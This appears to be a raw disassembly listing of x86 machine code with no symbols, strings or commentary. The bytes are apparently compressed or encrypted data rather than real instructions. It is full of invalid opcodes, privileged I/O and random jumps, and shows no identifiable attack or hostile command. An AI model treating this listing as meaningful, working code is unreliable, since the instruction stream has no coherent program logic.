  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax+0x5f0d42b4],bp
  4215e4:	xchg   ecx,eax
  4215e5:	fsub   DWORD PTR [edi+0x66]
  4215e8:	add    DWORD PTR [eax],eax
  4215ea:	add    BYTE PTR [ecx],al
  4215ec:	add    BYTE PTR [eax],al
  4215ee:	ror    DWORD PTR [edi-0x79130e42],cl
  4215f4:	add    ah,BYTE PTR [ebx+0x33ab38b1]
  4215fa:	mov    ah,0x96
  4215fc:	retf   
  4215fd:	inc    esp
  4215fe:	mov    eax,ds:0xd4b5b70
  421603:	call   FWORD PTR [ebp+0x68e6b781]
  421609:	frstor [esi-0x41f1a441]
  42160f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421610:	(bad)  
  421611:	(bad)
  421614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421615:	aad    0xf2
  421617:	out    0x6f,eax
  421619:	jnp    0x421638
  42161b:	ret    
  42161c:	adc    al,0xad
  42161e:	jle    0x421622
  421620:	push   ss
  421621:	ins    DWORD PTR es:[edi],dx
  421622:	pop    ss
  421623:	xchg   ebx,eax
  421624:	popa   
  421625:	fsubr  QWORD PTR [ebp+0x50]
  421628:	inc    esi
  421629:	(bad)  
  42162a:	adc    al,0x10
  42162c:	fbld   TBYTE PTR [eax]
  42162e:	jle    0x421602
  421630:	neg    BYTE PTR [esi+0x31]
  421633:	mov    ebx,0xd40bd3c2
  421638:	mov    ah,0x4b
  42163a:	daa    
  42163b:	xchg   BYTE PTR [edi+0x44],al
  42163e:	push   ss
  42163f:	in     eax,0x4f
  421641:	jmp    0x42161e
  421643:	or     BYTE PTR [esi+eiz*2+0x6b933d24],al
  42164a:	sub    BYTE PTR [ecx-0x10aa1699],bl
  421650:	and    edx,DWORD PTR [esi+0x6c]
  421653:	call   0x54e79372
  421658:	cmp    al,0xb2
  42165a:	xor    esi,DWORD PTR [ebx-0x1f]
  42165d:	(bad)  
  42165f:	push   es
  421660:	call   0xbfe8:0x59b7ee3a
  421667:	jle    0x4216e5
  421669:	aas    
  42166a:	ret    0xb8be
  42166d:	xchg   ebx,eax
  42166e:	and    DWORD PTR [eax],ebp
  421670:	(bad)  
  421671:	sub    ecx,DWORD PTR [ecx-0x6a]
  421674:	sub    BYTE PTR [ebp+0x1a43dd5f],dl
  42167a:	cld    
  42167b:	jle    0x4216cc
  42167d:	loop   0x42168c
  42167f:	and    eax,0xf24881f4
  421684:	and    bl,al
  421686:	xchg   edx,eax
  421687:	out    0xe7,eax
  421689:	and    DWORD PTR [esi+eiz*1-0x4d7fcd57],ecx
  421690:	stc    
  421691:	sahf   
  421692:	cmp    al,0xed
  421694:	aaa    
  421695:	xchg   ecx,eax
  421696:	imul   ebx,ecx,0xa25cfd0c
  42169c:	xor    al,0x2b
  42169e:	jl     0x4216ec
  4216a0:	and    al,0xe1
  4216a2:	cmp    eax,0x26e0f19f
  4216a7:	mov    dh,0x45
  4216a9:	push   0x52
  4216ab:	cmp    BYTE PTR [eax+0x4d],dh
  4216ae:	mov    WORD PTR [ebx+0x138e620a],es
  4216b4:	out    dx,al
  4216b5:	xchg   DWORD PTR ds:0x60ff0bba,eax
  4216bb:	fcmovb st,st(2)
  4216bd:	sub    eax,0x5d4f833f
  4216c2:	(bad)  
  4216c3:	xor    BYTE PTR [ecx+0x3e],dl
  4216c6:	popa   
  4216c7:	or     bl,al
  4216c9:	sub    bh,BYTE PTR [esi+0x5ca87d2f]
  4216cf:	loop   0x42165e
  4216d1:	popf   
  4216d2:	(bad)  
  4216d3:	or     bh,ah
  4216d5:	mov    dh,BYTE PTR [ecx]
  4216d7:	adc    eax,0x68a8fd07
  4216dc:	add    BYTE PTR [edx],ah
  4216de:	or     al,0x7
  4216e0:	scas   al,BYTE PTR es:[edi]
  4216e1:	jle    0x4216cf
  4216e3:	mov    ebx,0xf52feb1
  4216e8:	or     ebx,DWORD PTR [esi-0x1a]
  4216eb:	mov    eax,ds:0x8a0c
	...
  421754:	add    BYTE PTR [eax],al
  421756:	stos   DWORD PTR es:[edi],eax
  421757:	sub    al,0xed
  421759:	stos   BYTE PTR es:[edi],al
  42175a:	out    dx,eax
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	dec    esi
  421763:	or     eax,0x6767d27c
  421768:	add    DWORD PTR [eax],eax
  42176a:	add    BYTE PTR [ecx],al
  42176c:	add    BYTE PTR [eax],al
  42176e:	mov    cl,0x41
  421770:	std    
  421771:	jg     0x421781
  421773:	ss cmp esp,esp
  421776:	into   
  421777:	xor    dh,BYTE PTR [ecx-0x154d8559]
  42177d:	dec    ebp
  42177e:	leave  
  42177f:	retf   0xae93
  421782:	push   0xa33e8179
  421787:	mov    ch,0x4e
  42178a:	add    BYTE PTR [edx+0x47],0xc4
  42178e:	cmp    DWORD PTR [esi+0x2e3d7a3b],edi
  421794:	inc    ebx
  421795:	jmp    0x42179d
  421797:	ss jbe 0x4217c6
  42179a:	(bad)  
  42179c:	mov    bh,0x78
  42179e:	dec    eax
  42179f:	jp     0x4217d5
  4217a1:	mov    ecx,0xd7873f4b
  4217a6:	xor    ebp,edi
  4217a8:	out    0xc4,al
  4217aa:	pusha  
  4217ab:	xchg   DWORD PTR [ebp-0x66],esi
  4217ae:	das    
  4217af:	mov    WORD PTR [ecx+ebx*1+0x363fce44],cs
  4217b6:	inc    edi
  4217b7:	mov    ebx,0xdfc583b1
  4217bc:	les    ebx,FWORD PTR [ebp+ebp*1-0x2a04c3a9]
  4217c3:	inc    esp
  4217c4:	inc    ebx
  4217c5:	or     esi,0xd1294918
  4217cb:	loopne 0x42177d
  4217cd:	push   es
  4217ce:	out    0x13,al
  4217d0:	fbld   TBYTE PTR [edi]
  4217d2:	lahf   
  4217d3:	call   0x220f4fe2
  4217d8:	fs fwait
  4217da:	in     eax,0xc
  4217dc:	xor    BYTE PTR [edi+0x5659a6df],bl
  4217e2:	arpl   WORD PTR [edi],di
  4217e4:	push   ecx
  4217e5:	pop    esi
  4217e6:	cmp    eax,0xdac78594
  4217eb:	int3   
  4217ec:	cld    
  4217ed:	pop    ebp
  4217ee:	fld    QWORD PTR [esi-0x1810a35]
  4217f4:	cld    
  4217f5:	in     al,dx
  4217f6:	nop
  4217f7:	cmp    eax,0xb12ade7c
  4217fc:	mov    ds:0x5504aa0,al
  421801:	or     eax,0x8b2f3999
  421806:	inc    edx
  421807:	push   ss
  421808:	shl    DWORD PTR [eax-0x21869c5c],0x56
  42180f:	adc    BYTE PTR [esp+eax*2+0x6d],al
  421813:	sub    edx,ebp
  421815:	cli    
  421816:	mov    al,ds:0x5e826c01
  42181b:	ror    edi,cl
  42181d:	pusha  
  42181e:	and    al,0xb6
  421820:	push   ds
  421821:	clc    
  421822:	inc    ebp
  421823:	xor    BYTE PTR [ebp+0x71],dh
  421826:	mov    edi,0x2adeba0d
  42182b:	ds test al,0xcf
  42182e:	cmp    edx,esp
  421830:	(bad)  
  421831:	dec    edx
  421832:	adc    ah,BYTE PTR [ecx-0x19]
  421835:	cs sub bl,cl
  421838:	das    
  421839:	mov    ds,WORD PTR gs:[esi+0x393bc8f2]
  421840:	shl    bl,0x68
  421843:	inc    esp
  421844:	test   DWORD PTR [esi-0x74],0x4003fc0a
  42184b:	push   ebp
  42184c:	pushf  
  42184d:	out    0xb3,al
  42184f:	inc    edi
  421850:	pop    DWORD PTR [ecx-0x25527e65]
  421856:	xor    al,0xb1
  421858:	mov    DWORD PTR [ebx+0x71],ebx
  42185b:	fadd   QWORD PTR [ecx-0x5a]
  42185e:	(bad)  
  42185f:	jne    0x4218ba
  421861:	dec    esi
  421862:	inc    ebp
  421863:	and    edx,DWORD PTR [edx+ecx*2+0x0]
  421867:	mov    bh,0xd4
  421869:	data16 out 0x9a,al
  42186c:	mov    cl,0xa3
	...
  4218d6:	shl    DWORD PTR [eax-0x6061f47],1
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	inc    eax
  4218e3:	les    edx,FWORD PTR [eax-0x19]
  4218e6:	addr16 push 0x1000001
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	jle    0x42187d
  4218f0:	(bad)  
  4218f1:	mov    ch,0x97
  4218f3:	pop    ebx
  4218f4:	loope  0x421921
  4218f6:	pop    es
  4218f7:	(bad)  
  4218f9:	imul   esp,DWORD PTR [ecx+0x3f],0xfffffffa
  4218fd:	sbb    dl,BYTE PTR ds:0x9beece0b
  421903:	mov    dh,0x65
  421905:	sahf   
  421906:	dec    ebx
  421907:	xor    DWORD PTR [ecx+eax*1-0x5908d7eb],ecx
  42190e:	dec    ebp
  42190f:	sub    BYTE PTR [ecx-0x43],dl
  421912:	add    DWORD PTR [ebx+ebp*8+0x4f98e7b2],edi
  421919:	inc    ebp
  42191a:	pop    es
  42191b:	fwait
  42191c:	mov    al,0x7a
  42191e:	mov    ch,0xf9
  421920:	aas    
  421921:	(bad)  
  421923:	out    0xae,al
  421925:	pop    ecx
  421926:	xchg   ebp,eax
  421927:	out    0x2f,al
  421929:	arpl   WORD PTR [eax-0x15],ax
  42192c:	xor    cl,BYTE PTR [esi-0x47]
  42192f:	cli    
  421930:	mov    cl,0xbf
  421932:	ins    BYTE PTR es:[edi],dx
  421933:	ds xchg ebp,eax
  421935:	pop    ebp
  421936:	mov    dh,0x5
  421938:	jo     0x421906
  42193a:	push   ss
  42193b:	cmp    eax,0x3b10f5c9
  421940:	in     eax,0x88
  421942:	out    dx,eax
  421943:	add    al,0xe9
  421945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421946:	jnp    0x4218d0
  421948:	loop   0x421964
  42194a:	jecxz  0x421934
  42194c:	inc    ecx
  42194d:	test   eax,0xabc826ae
  421952:	and    ecx,esi
  421954:	sub    DWORD PTR [ecx+0x6aec28b2],edx
  42195a:	lock push eax
  42195c:	(bad)  
  42195d:	jle    0x4219d8
  42195f:	mov    al,0x60
  421961:	test   BYTE PTR [eax],bh
  421963:	pop    es
  421964:	or     eax,0x5bbe5aba
  421969:	ret    0x806b
  42196c:	jg     0x42191e
  42196e:	mov    ecx,0xaf1fad54
  421973:	out    dx,eax
  421974:	pop    esi
  421975:	loope  0x421984
  421977:	mul    DWORD PTR [edx]
  421979:	call   0xed9dff29
  42197e:	inc    edx
  42197f:	cmp    BYTE PTR [edi],cl
  421981:	loop   0x421a01
  421983:	scas   al,BYTE PTR es:[edi]
  421984:	std    
  421985:	jp     0x421938
  421987:	lods   al,BYTE PTR ds:[esi]
  421988:	add    DWORD PTR [edi+ebp*2],eax
  42198b:	data16 jg 0x421984
  42198e:	cmp    DWORD PTR [edx-0x7d5f1786],edi
  421994:	xor    eax,0x2e5baf76
  421999:	mov    ds:0x655dea9f,eax
  42199e:	sahf   
  42199f:	imul   esp,DWORD PTR [edx+edx*1],0xdbc3b588
  4219a6:	imul   edi,edx,0x194f60e3
  4219ac:	add    eax,0x2598e3a1
  4219b1:	loope  0x4219ac
  4219b3:	fdiv   st,st(4)
  4219b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219b6:	js     0x4219f9
  4219b8:	in     eax,dx
  4219b9:	cmc    
  4219ba:	pop    ecx
  4219bb:	or     bl,BYTE PTR [ecx]
  4219bd:	mov    bh,0x59
  4219bf:	std    
  4219c0:	mov    eax,ds:0xec4970d7
  4219c5:	pop    eax
  4219c6:	dec    ebp
  4219c7:	dec    ebx
  4219c8:	ins    BYTE PTR es:[edi],dx
  4219c9:	js     0x4219f7
  4219cb:	mov    ecx,DWORD PTR [esp+ebx*2-0xf008a2f]
  4219d2:	cmp    al,0xc3
  4219d4:	repz push es
  4219d6:	fdivr  st(2),st
  4219d8:	push   es
  4219d9:	mov    al,ds:0xc952eecc
  4219de:	lods   eax,DWORD PTR ds:[esi]
  4219df:	pop    esi
  4219e0:	js     0x421999
  4219e2:	xchg   ebp,eax
  4219e3:	cmp    edx,eax
  4219e5:	lds    esi,FWORD PTR [ecx+eax*8-0x46ea6a36]
  4219ec:	sub    ecx,DWORD PTR [edx+0x0]
	...
  421a56:	(bad)  
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	cmp    dl,0xe3
  421a65:	add    ah,BYTE PTR [edi+0x69]
  421a68:	add    DWORD PTR [eax],eax
  421a6a:	add    BYTE PTR [ecx],al
  421a6c:	add    BYTE PTR [eax],al
  421a6e:	mov    DWORD PTR [ecx-0x7c],0x88f24676
  421a75:	pop    ds
  421a76:	icebp  
  421a77:	cmp    DWORD PTR [esi-0x4e],ebx
  421a7a:	adc    DWORD PTR [ecx+0x34e52f12],edi
  421a80:	xchg   BYTE PTR [ebx],al
  421a82:	fidiv  DWORD PTR [ebp+0x61]
  421a85:	dec    esp
  421a86:	xor    al,0x0
  421a88:	push   ecx
  421a89:	push   0xd7eec3e6
  421a8e:	xchg   ecx,eax
  421a8f:	sub    ah,ah
  421a91:	dec    ebx
  421a92:	add    eax,0x7b5476e6
  421a97:	jl     0x421afe
  421a99:	lods   al,BYTE PTR ds:[esi]
  421a9a:	and    ah,dl
  421a9c:	xchg   esi,eax
  421a9d:	sub    DWORD PTR [edx-0x31],eax
  421aa0:	mov    DWORD PTR [eax+esi*1+0x16],ecx
  421aa4:	xor    eax,0x5f33f134
  421aa9:	loopne 0x421aa9
  421aab:	(bad)  
  421aac:	popa   
  421aad:	xor    eax,0x287a94c9
  421ab2:	pop    ss
  421ab3:	dec    esp
  421ab4:	pop    edx
  421ab5:	daa    
  421ab6:	xchg   ebx,eax
  421ab7:	dec    edx
  421ab8:	adc    ecx,0x24
  421abb:	shl    DWORD PTR [ebp+eax*1-0x74089ea4],cl
  421ac2:	lods   al,BYTE PTR ds:[esi]
  421ac3:	js     0x421a4b
  421ac5:	sbb    eax,0xe141cdcc
  421aca:	mov    eax,ds:0x47e614f4
  421acf:	lods   al,BYTE PTR ds:[esi]
  421ad0:	std    
  421ad1:	nop
  421ad2:	add    esi,0x35
  421ad5:	adc    al,0x2a
  421ad7:	cdq    
  421ad8:	les    edx,FWORD PTR [ecx+ecx*1+0x1bf25a1e]
  421adf:	or     esp,DWORD PTR [esp+ecx*1-0x200cef35]
  421ae6:	pop    es
  421ae7:	idiv   BYTE PTR [eax+eax*2]
  421aea:	jmp    0xae39:0x5bd36083
  421af1:	(bad)  
  421af2:	loope  0x421acd
  421af4:	fild   WORD PTR [esi+edi*1+0x33]
  421af8:	loopne 0x421b3a
  421afa:	inc    esi
  421afb:	ror    DWORD PTR [edi+ecx*8],cl
  421afe:	rol    BYTE PTR [ecx+0x586e543b],0x23
  421b05:	arpl   ax,si
  421b07:	or     ebx,esi
  421b09:	dec    edx
  421b0a:	cli    
  421b0b:	sub    cl,ah
  421b0d:	fwait
  421b0e:	test   al,0xa3
  421b10:	test   eax,0x5c965c11
  421b15:	add    eax,DWORD PTR ds:0xe2b2bcc1
  421b1b:	mov    dh,bl
  421b1d:	pop    es
  421b1e:	clc    
  421b1f:	(bad)  
  421b20:	and    edx,DWORD PTR [ebp-0x20323728]
  421b26:	push   esp
  421b27:	dec    ecx
  421b28:	into   
  421b29:	jns    0x421ab6
  421b2b:	cmp    al,0xed
  421b2d:	gs adc eax,0x9fe998f2
  421b33:	aad    0x91
  421b35:	inc    edi
  421b36:	arpl   WORD PTR [edx],ax
  421b38:	sub    DWORD PTR [bx],ebp
  421b3b:	(bad)  
  421b3c:	lods   eax,DWORD PTR ds:[esi]
  421b3d:	mov    ch,BYTE PTR [ecx+0x48]
  421b40:	scas   al,BYTE PTR es:[edi]
  421b41:	dec    esi
  421b42:	lds    ebx,FWORD PTR [edi-0x11]
  421b45:	mov    al,0xd6
  421b47:	mov    ebx,0x7d4f77be
  421b4c:	mov    ebp,DWORD PTR [esi+0x46d71427]
  421b52:	mov    ecx,0xf16bca3f
  421b57:	xor    al,0x2e
  421b59:	pop    eax
  421b5a:	dec    ebp
  421b5b:	clc    
  421b5c:	pop    ecx
  421b5d:	mov    ds:0xb3a5d4fa,eax
  421b62:	push   ss
  421b63:	push   esi
  421b64:	xlat   BYTE PTR ds:[ebx]
  421b65:	mov    al,ds:0x33c4485f
  421b6a:	ror    BYTE PTR [edi+0x6d0e],0x0
	...
  421bd5:	add    BYTE PTR [esi],dl
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     ah,BYTE PTR [edx+ebp*8]
  421be4:	and    ebp,DWORD PTR [edi+0x16a67]
  421bea:	add    BYTE PTR [ecx],al
  421bec:	add    BYTE PTR [eax],al
  421bee:	ficomp WORD PTR [edx-0x6]
  421bf1:	icebp  
  421bf2:	dec    ecx
  421bf3:	(bad)  
  421bf4:	aam    0x17
  421bf6:	retf   0x4e36
  421bf9:	sub    ch,BYTE PTR [ebx-0x723b854]
  421bff:	daa    
  421c00:	loop   0x421c25
  421c02:	das    
  421c03:	test   eax,0xb88ebec3
  421c08:	adc    BYTE PTR [ebx],dl
  421c0a:	stc    
  421c0b:	add    eax,0xa440bfc1
  421c10:	in     al,0x32
  421c12:	fisubr WORD PTR [ecx]
  421c14:	(bad)
  421c18:	fwait
  421c19:	mov    dh,0xe3
  421c1b:	adc    al,0xf0
  421c1d:	push   cs
  421c1e:	pop    edi
  421c1f:	mov    ?,WORD PTR [esp+ecx*4-0x51556ec8]
  421c26:	sbb    DWORD PTR [edx],ebp
  421c28:	(bad)
  421c2c:	ja     0x421c74
  421c2e:	mov    al,ds:0x3aac7000
  421c33:	mov    BYTE PTR [edx-0x26],bh
  421c36:	or     BYTE PTR [esi],bl
  421c38:	int    0xca
  421c3a:	pop    DWORD PTR [edx]
  421c3c:	jno    0x421bed
  421c3e:	call   0x350c:0xae15ec58
  421c45:	or     edi,eax
  421c47:	sbb    eax,0xbb3e8272
  421c4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c4d:	shl    DWORD PTR [ecx+0x76],1
  421c50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c51:	mov    edi,0x20028fa3
  421c56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c57:	xchg   DWORD PTR [edx-0x4],edx
  421c5a:	ror    DWORD PTR [edi+0x1624149e],0x42
  421c61:	outs   dx,BYTE PTR ds:[esi]
  421c62:	sub    edx,DWORD PTR [esi+eax*8+0x21ae2406]
  421c69:	dec    ebx
  421c6a:	(bad)  
  421c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c6d:	repz mov dl,0x98
  421c70:	sub    BYTE PTR [edi+0x6dc86a22],dl
  421c76:	or     ebx,DWORD PTR [esi+0x64ad2fdd]
  421c7c:	callw  0x31e7
  421c80:	test   BYTE PTR [edx+0x38fa9322],ah
  421c86:	ret    
  421c87:	adc    BYTE PTR [ebx],cl
  421c89:	ins    DWORD PTR es:[edi],dx
  421c8a:	fcom   QWORD PTR [edi+0x767328f8]
  421c90:	mov    ch,BYTE PTR [ebx-0x55371f0e]
  421c96:	mov    eax,0xcd00e26a
  421c9b:	mov    cl,0x63
  421c9d:	add    eax,0x1a52a255
  421ca2:	scas   eax,DWORD PTR es:[edi]
  421ca3:	mov    ah,0xac
  421ca5:	xor    al,0x53
  421ca7:	ror    BYTE PTR [ebx+edx*8],cl
  421caa:	sbb    al,0xd4
  421cac:	mov    esp,0x980f0c11
  421cb1:	(bad)  
  421cb3:	xchg   edi,eax
  421cb4:	xor    BYTE PTR [eax],ah
  421cb6:	sub    ch,BYTE PTR [ebx-0x69bd27b7]
  421cbc:	adc    esp,DWORD PTR fs:[edx]
  421cbf:	mov    ds:0x6cf87e,al
  421cc4:	xchg   esi,eax
  421cc5:	inc    ecx
  421cc6:	dec    esp
  421cc7:	sar    DWORD PTR [eax],1
  421cc9:	in     al,dx
  421cca:	mov    al,ds:0x4f7ff502
  421ccf:	push   edi
  421cd0:	gs rcl dl,cl
  421cd3:	test   BYTE PTR [ebp+0x27969f85],0xe3
  421cda:	push   edi
  421cdb:	sbb    bh,BYTE PTR [edi+edi*2]
  421cde:	dec    ecx
  421cdf:	jg     0x421d29
  421ce1:	push   ecx
  421ce2:	jne    0x421d1b
  421ce4:	jo     0x421cfb
  421ce6:	push   ds
  421ce7:	push   ebp
  421ce8:	cmp    bh,BYTE PTR [eax+0x5c]
  421ceb:	cmp    DWORD PTR [ebp+0x6],0x0
	...
  421d56:	mov    al,0x6b
  421d58:	mov    ch,0xe5
  421d5a:	(bad)  
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	aaa    
  421d63:	xchg   esp,eax
  421d64:	inc    ecx
  421d65:	hlt    
  421d66:	imul   eax,DWORD PTR [bx+di],0x0
  421d6a:	add    BYTE PTR [ecx],al
  421d6c:	add    BYTE PTR [eax],al
  421d6e:	fnstcw WORD PTR [edx]
  421d70:	xchg   ebp,eax
  421d71:	hlt    
  421d72:	fist   WORD PTR fs:[edx]
  421d75:	mov    ?,WORD PTR [eax-0x1a]
  421d78:	das    
  421d79:	xchg   ebp,eax
  421d7a:	jno    0x421d35
  421d7c:	gs ja  0x421d2a
  421d7f:	popf   
  421d80:	mov    esp,0xf25a0cbb
  421d85:	cmc    
  421d86:	mov    dh,0xa9
  421d88:	je     0x421d9f
  421d8a:	pop    ecx
  421d8b:	mov    ds:0x6be97035,al
  421d90:	jo     0x421dce
  421d92:	in     eax,0xe4
  421d94:	icebp  
  421d95:	inc    eax
  421d96:	nop
  421d97:	mov    dl,0xdd
  421d99:	retf   
  421d9a:	aad    0xb5
  421d9c:	push   ds
  421d9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d9e:	sub    dh,ah
  421da0:	jecxz  0x421e0a
  421da2:	and    dh,BYTE PTR [ebx]
  421da4:	jmp    0xb40bd96f
  421da9:	in     al,0x3f
  421dab:	outs   dx,DWORD PTR ds:[esi]
  421dac:	push   ds
  421dad:	jno    0x421dab
  421daf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421db0:	or     eax,0x43c5b896
  421db5:	mov    cl,0xe0
  421db7:	xor    DWORD PTR [ebx],eax
  421db9:	mul    DWORD PTR [ecx]
  421dbb:	popf   
  421dbc:	(bad)  
  421dbd:	cmp    cl,BYTE PTR [edi]
  421dbf:	cld    
  421dc0:	xor    BYTE PTR [esi+0x5d],cl
  421dc3:	jb     0x421d57
  421dc5:	pop    eax
  421dc6:	pop    ebx
  421dc7:	mov    DWORD PTR [eax-0x75],ebx
  421dca:	sahf   
  421dcb:	repz push cs
  421dcd:	xchg   ebp,eax
  421dce:	(bad)  
  421dcf:	stc    
  421dd0:	add    al,0xae
  421dd2:	les    eax,FWORD PTR [esi]
  421dd4:	shl    edi,1
  421dd6:	ret    0xf1f8
  421dd9:	mov    cl,0xee
  421ddb:	inc    ebx
  421ddc:	mov    edx,DWORD PTR ds:0xb94c3494
  421de2:	(bad)  
  421de3:	adc    esp,esi
  421de5:	pop    ss
  421de6:	pop    ebp
  421de7:	out    dx,eax
  421de8:	sbb    DWORD PTR [edi+edi*4-0x48],ecx
  421dec:	adc    al,0x1f
  421dee:	(bad)  
  421def:	dec    edx
  421df0:	jbe    0x421dea
  421df2:	xor    eax,0xe36fcfcf
  421df7:	add    BYTE PTR [edx+0x36],dh
  421dfa:	sti    
  421dfb:	adc    DWORD PTR [ebx+0x4b9bb069],ebp
  421e01:	dec    edi
  421e02:	repnz data16 hlt 
  421e05:	jmp    0x5198:0x18c601c7
  421e0c:	imul   ebx,eax,0x3f
  421e0f:	or     edi,DWORD PTR [esi+0x18]
  421e12:	aaa    
  421e13:	pop    edx
  421e14:	mov    dh,0xbe
  421e16:	maxps  xmm3,XMMWORD PTR [ebx]
  421e19:	push   0xffffff84
  421e1b:	stos   BYTE PTR es:[edi],al
  421e1c:	xor    al,0xf6
  421e1e:	daa    
  421e1f:	hlt    
  421e20:	cmp    al,BYTE PTR [edi]
  421e22:	ins    BYTE PTR es:[edi],dx
  421e23:	xor    edi,edx
  421e25:	daa    
  421e26:	cmp    DWORD PTR ds:0xe0833b6b,eax
  421e2c:	jb     0x421e9c
  421e2e:	pop    ss
  421e2f:	pop    ecx
  421e30:	js     0x421dd8
  421e32:	xor    DWORD PTR [eax-0x34],edi
  421e35:	pop    ecx
  421e36:	nop
  421e37:	fs out 0x1,al
  421e3a:	and    edi,DWORD PTR [ecx+0x25bad742]
  421e40:	(bad)  [edx+esi*4]
  421e43:	inc    eax
  421e44:	aad    0x9a
  421e46:	lds    edx,FWORD PTR [edi]
  421e48:	or     dl,al
  421e4a:	xchg   esp,eax
  421e4b:	inc    esp
  421e4c:	fist   DWORD PTR [esi+0x1c]
  421e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e50:	and    eax,0x1e007033
  421e55:	bound  esi,QWORD PTR [ebx-0x5160b0da]
  421e5b:	div    BYTE PTR [eax]
  421e5d:	jns    0x421e1d
  421e5f:	pop    ecx
  421e60:	fistp  DWORD PTR [ebx]
  421e62:	push   esi
  421e63:	fsubp  st(0),st
  421e65:	shl    DWORD PTR [esi-0x39],0xe3
  421e69:	pop    esp
  421e6a:	data16 (bad) 
  421e6c:	and    DWORD PTR [esi+0x0],eax
	...
  421ed6:	iret   
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	dec    edx
  421ee3:	cmp    al,0x6f
  421ee5:	cmp    BYTE PTR [edi+0x6c],ah
  421ee8:	add    DWORD PTR [eax],eax
  421eea:	add    BYTE PTR [ecx],al
  421eec:	add    BYTE PTR [eax],al
  421eee:	ror    DWORD PTR [ecx+0x71815cb9],0x74
  421ef5:	shr    al,cl
  421ef7:	sbb    eax,0x6d12b212
  421efc:	dec    esi
  421efd:	mov    edx,0x257f0bc6
  421f02:	icebp  
  421f03:	xor    dl,BYTE PTR [ebx+edx*8+0x578cba82]
  421f0a:	inc    edi
  421f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f0c:	cdq    
  421f0d:	xchg   esp,eax
  421f0e:	inc    edx
  421f0f:	adc    eax,0xfd4e7f67
  421f14:	jno    0x421f87
  421f16:	loop   0x421ef7
  421f18:	in     al,0xa6
  421f1a:	xchg   bl,bl
  421f1c:	retf   
  421f1d:	adc    esp,DWORD PTR ds:0xdb23bc5d
  421f23:	cmp    al,0xd3
  421f25:	jg     0x421fa0
  421f27:	ud1    ebp,DWORD PTR [edi-0xf]
  421f2b:	pop    DWORD PTR [ebx]
  421f2d:	and    eax,0xa8e4052c
  421f32:	imul   BYTE PTR [edx-0x5786338b]
  421f38:	sar    ecx,0x86
  421f3b:	lea    eax,[esi+0x24feb4e5]
  421f41:	iret   
  421f42:	mov    dl,0x1f
  421f44:	sub    ebx,DWORD PTR [ebx+esi*4-0x6d]
  421f48:	mov    esp,0x2f6f7c0
  421f4d:	aas    
  421f4e:	xchg   DWORD PTR [ecx],ebx
  421f50:	sbb    eax,0xdd48bd1b
  421f55:	dec    eax
  421f56:	pop    ss
  421f57:	ror    bl,cl
  421f59:	mov    edi,0x1c9acb31
  421f5e:	sbb    dh,ch
  421f60:	std    
  421f61:	lods   al,BYTE PTR ds:[esi]
  421f62:	(bad)  
  421f63:	add    eax,edx
  421f65:	xchg   ecx,eax
  421f66:	fld    st(5)
  421f68:	dec    edx
  421f69:	retf   0x3903
  421f6c:	xchg   ebp,eax
  421f6d:	adc    al,0x4f
  421f6f:	aas    
  421f70:	sub    al,0x4d
  421f72:	sbb    BYTE PTR [eax+0xdaf6d3f],dl
  421f78:	xchg   esi,eax
  421f79:	mov    bl,0xf2
  421f7b:	cmp    bh,BYTE PTR [eax-0x4f00fdd2]
  421f81:	test   eax,0xd68786a3
  421f86:	(bad)  
  421f88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f89:	inc    edi
  421f8a:	ins    DWORD PTR es:[edi],dx
  421f8b:	jge    0x421f30
  421f8d:	push   ebp
  421f8e:	pop    edx
  421f8f:	retf   
  421f90:	dec    eax
  421f91:	out    0x3f,eax
  421f93:	shl    BYTE PTR [eax+0x4f0b3369],1
  421f99:	and    eax,ebp
  421f9b:	sbb    DWORD PTR [ebp+0x3c],esp
  421f9e:	cmp    al,0xd8
  421fa0:	xchg   edx,eax
  421fa1:	xlat   BYTE PTR ds:[ebx]
  421fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fa3:	and    eax,0x97042c63
  421fa8:	clc    
  421fa9:	adc    DWORD PTR [ebp+0x6f469a46],ebx
  421faf:	ja     0x421ffe
  421fb1:	and    ecx,DWORD PTR [eax+eax*8-0x1b]
  421fb5:	lods   al,BYTE PTR ds:[esi]
  421fb6:	add    DWORD PTR [esi+0x75],0x27
  421fba:	jbe    0x421f68
  421fbc:	xor    DWORD PTR [ebx+0xe8bf21f],ebp
  421fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fc3:	pop    eax
  421fc4:	pop    esi
  421fc5:	adc    BYTE PTR [edx+0x63],bh
  421fc8:	push   eax
  421fc9:	cld    
  421fca:	test   al,0xcf
  421fcc:	adc    eax,0x943394e2
  421fd1:	mov    dl,0x65
  421fd3:	adc    al,0x96
  421fd5:	fwait
  421fd6:	add    esi,eax
  421fd8:	and    al,0x2d
